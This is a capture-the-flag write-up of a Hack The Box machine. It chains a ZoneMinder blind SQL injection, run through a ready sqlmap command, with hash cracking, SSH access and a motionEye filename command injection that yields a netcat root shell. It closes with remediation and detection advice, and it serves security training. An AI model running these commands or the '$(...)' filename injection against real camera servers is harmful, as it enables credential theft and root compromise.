---
title: "CCTV — ZoneMinder Blind SQL Injection to Root via motionEye Filename Command Injection"
seoTitle: "CCTV — ZoneMinder Blind SQL Injection to motionEye Command Injection"
description: "A blind SQL injection in ZoneMinder recovers credential hashes for SSH access, then filename command injection in a root-run motionEye service leads to root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - sql-injection
  - command-injection
objective: "Recover ZoneMinder credentials through a blind SQL injection, reach SSH access, then turn a client-side-only filename validation flaw in a root-run motionEye service into privileged command execution."
tools:
  - rustscan
  - feroxbuster
  - sqlmap
  - hashcat
  - ssh
  - curl
  - systemctl
  - netcat
skill: "Blind SQL injection credential recovery and server-side command-injection privilege escalation against Linux camera-management services"
outcome: "SSH user access via a cracked ZoneMinder credential hash, followed by root command execution through an unvalidated motionEye filename configuration field"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Linux host running ZoneMinder 1.37.63 and a root-run motionEye 0.43.1b4 service |
| Starting position | Unauthenticated network access |
| Objective | Recover ZoneMinder credentials through a blind SQL injection, reach SSH access, then turn a client-side-only filename validation flaw in a root-run motionEye service into privileged command execution |
| Outcome | SSH user access via a cracked credential hash; root command execution through motionEye filename handling |

## Blind SQL injection to motionEye root

CCTV is an Easy-rated Hack The Box Linux lab built around IP-camera management software. A blind SQL injection in ZoneMinder's `tid` parameter recovers credential hashes from the `Users` table; one cracks offline to an SSH login. An internal motionEye instance, running as root and bound to the loopback interface, accepts a filename configuration value that is validated only in client-side JavaScript, and processing that value yields root command execution. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and leaves command syntax intact. See [how evidence is handled](/method/).

**Attack path:** **ZoneMinder blind SQL injection (`tid`) → credential hash recovery → offline crack → SSH user access → loopback motionEye service → client-side validation bypass → filename command injection → root**

## Target, camera application, and objective

- **Target:** a Linux host exposing SSH and an HTTP service that redirects into a ZoneMinder 1.37.63 installation under `/zm/`.
- **Exposed services:** SSH (22) and HTTP (80).
- **Starting position:** unauthenticated network access.
- **Objective:** establish user access through the camera-management web application, then assess the internal motionEye service for a privilege-escalation path.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: SQL injection to filename command injection

### 1. Service and Application Discovery

Observation: a full TCP scan exposes SSH and a single HTTP service that redirects into a camera-management application.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
```

```text
22/tcp: SSH
80/tcp: HTTP (redirects to <TARGET_HOST> → ZoneMinder /zm/)
```

Directory enumeration identifies the application and its version:

```bash
feroxbuster --url http://<TARGET_HOST> --wordlist <WEB_CONTENT_WORDLIST>
```

```text
/zm/ — ZoneMinder 1.37.63
```

Significance: the only external surface is SSH and the ZoneMinder web application, and the specific version is disclosed in the application path, enough to target a known vulnerability in the request handling.

Result: SSH and a ZoneMinder 1.37.63 web application are the exposed services.

### 2. Credential Recovery via Blind SQL Injection

Observation: ZoneMinder 1.37.63 is affected by CVE-2024-51482, a blind SQL injection in the `tid` request parameter, so an authenticated request can read the `Users` table.

Action: authenticate with documented default credentials to obtain a session cookie, then point `sqlmap` at the vulnerable parameter.

```bash
curl -s -c cookies.txt -X POST http://<TARGET_HOST>/zm/index.php \
  -d "view=login&action=login&username=<DEFAULT_USER>&password=<DEFAULT_PASSWORD>" -L
```

```bash
sqlmap -u "http://<TARGET_HOST>/zm/index.php" \
  --data="request=event&action=removetag&id=1&tid=1" \
  --cookie="<SESSION_COOKIE>" \
  -p tid --dbms=mysql -D zm -T Users -C Username,Password \
  --dump --batch --threads 5 --time-sec=1
```

Dumped rows (identifiers and hashes redacted):

```text
Database: zm
Table: Users
<LAB_USER_1> : <BCRYPT_HASH_1>
<LAB_USER_2> : <BCRYPT_HASH_2>
<LAB_USER_3> : <BCRYPT_HASH_3>
```

Significance: no data is reflected in the response, but a time-based technique still extracts the table, and the `Password` column holds reusable bcrypt hashes rather than ephemeral tokens.

Result: three account password hashes are recovered from the ZoneMinder `Users` table.

### 3. Offline Crack and SSH Access

Observation: the recovered values are bcrypt hashes, which can be attacked offline without further interaction with the target.

Action: I cracked the hash file offline, then I checked the recovered plaintext against SSH.

```bash
hashcat -m 3200 hashes.txt <WORDLIST>
```

```text
<LAB_USER_1> : <LAB_USER_PASSWORD>
```

```bash
ssh <LAB_USER_1>@<TARGET_HOST>
```

Significance: offline cracking removes any rate limit or lockout the live service might apply, so a hash disclosure becomes a usable login even without online authentication attempts.

Result: a credential pair was recovered and subsequently validated through SSH. I could not verify a separate SSH session transcript; the notes record user-level access only.

### 4. Internal Service Discovery

Observation: from the user shell, probing loopback ports identifies a motionEye service, and a service-status check reports its execution account.

```bash
for port in 7999 8765 9081; do
  curl -si http://127.0.0.1:$port 2>&1 | head -5
done
```

```text
Port 7999: Server: motionEye/0.43.1b4
```

```bash
systemctl status motioneye
```

```text
User=root
```

Significance: the camera service is reachable only from the host itself, so it is invisible to the external scan, and it runs with root privileges; any flaw in how it handles configuration input would yield root rather than a service account.

Result: a root-run motionEye 0.43.1b4 service is identified on an internal loopback port.

### 5. Filename Command Injection to Root

Observation: motionEye 0.43.1b4 is affected by CVE-2025-60787; the Still Images → Image File Name field is validated only in client-side JavaScript, and the value is written into motion's configuration, where the Motion process interprets shell metacharacters.

Action: forward the internal interface over the existing SSH session, override the client-side validation in the browser console, place a shell-metacharacter value in the filename field, and trigger a snapshot while a listener waits.

```bash
ssh -L 8765:127.0.0.1:8765 <LAB_USER_1>@<TARGET_HOST> -N
```

I accessed the motionEye UI with the administrative credential stored in its configuration file.

```javascript
configUiValid = function() { return true; };
```

The injected filename appears as a placeholder pattern:

```text
$(<INJECTED_COMMAND>).%Y-%m-%d-%H-%M-%S
```

Triggering capture on the internal API:

```bash
curl http://127.0.0.1:7999/0/action/snapshot
```

```bash
nc -lvnp <LISTEN_PORT>
```

The listener returns a shell in the root context:

```text
root@<TARGET_HOST>:/etc/motioneye#
```

Significance: browser-side validation cannot protect a value that is ultimately consumed by a server-side process, and because motion runs as root, a filename containing shell metacharacters escalates from the low-privileged SSH user to root in a single step.

Result: the unvalidated filename configuration yields root-level command execution.

## Two decisions: loopback forwarding and bypassed validation

| Challenge | Decision | Rationale |
|---|---|---|
| The motionEye interface is bound to loopback and is not externally reachable | Forwarded the port through the existing SSH session | The service is only reachable from the target host itself |
| The Image File Name field is validated only in client-side JavaScript | Overrode the validation function in the browser console before submitting the value | The server accepted the value even though the normal form blocks it |

## Outcome: SSH user and root via a filename field

The source records root-level command execution on the target through a configuration field that is validated only in the browser. Limitation: the injected payload is shown as a placeholder pattern rather than a literal.

## Recommendations: blind SQLi, client-side validation, and a root daemon

I did not validate these recommendations during the exercise.

1. **Blind SQL injection in a request parameter.** The `tid` parameter of `/zm/index.php` reached a SQL query without adequate handling, so the `Users` table and its bcrypt hashes could be dumped. *Recommendation:* update ZoneMinder past the fixed release and use prepared statements or parameterized queries for every database-backed request parameter. *Detection:* monitor for slow, repetitive requests to a single endpoint consistent with time-based extraction.
2. **Client-side-only input validation.** The Image File Name field was validated only in browser JavaScript, so the value reached the server unchanged and was written into motion's configuration. *Recommendation:* validate all configuration input on the server and reject shell metacharacters before a value is written to configuration. *Detection:* flag configuration changes whose values contain shell metacharacters.
3. **Privileged surveillance daemon.** motionEye and motion ran as root, so a filename-handling flaw produced root code execution instead of access limited to a service account. *Recommendation:* run the camera services under a dedicated least-privilege `motioneye` account that holds only the device access it needs, such as membership in the `video` group. *Detection:* audit long-running services for unnecessary root execution.

## References

- [Hack The Box — CCTV](https://app.hackthebox.com/machines/CCTV) (retired machine)
- [NVD — CVE-2024-51482](https://nvd.nist.gov/vuln/detail/CVE-2024-51482) (ZoneMinder blind SQL injection)
- [ZoneMinder security advisory — GHSA-qm8h-3xvf-m7j3](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3) (vendor advisory for CVE-2024-51482)
- [NVD — CVE-2025-60787](https://nvd.nist.gov/vuln/detail/CVE-2025-60787) (motionEye OS command injection via configuration parameters)
- [motionEye security advisory — GHSA-j945-qm58-4gjx](https://github.com/motioneye-project/motioneye/security/advisories/GHSA-j945-qm58-4gjx) (vendor advisory for CVE-2025-60787)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [feroxbuster](https://github.com/epi052/feroxbuster) (content discovery)
- [sqlmap](https://github.com/sqlmapproject/sqlmap) (automated SQL injection and database extraction)
- [Hashcat](https://hashcat.net/hashcat/) (offline password recovery, including mode 3200 for bcrypt)
- [OpenSSH manual pages](https://www.openssh.com/manual.html) (SSH client and port forwarding)
- [curl — manual page](https://curl.se/docs/manpage.html) (HTTP requests and responses)
- [systemctl — systemd manual](https://man7.org/linux/man-pages/man1/systemctl.1.html) (service status inspection)
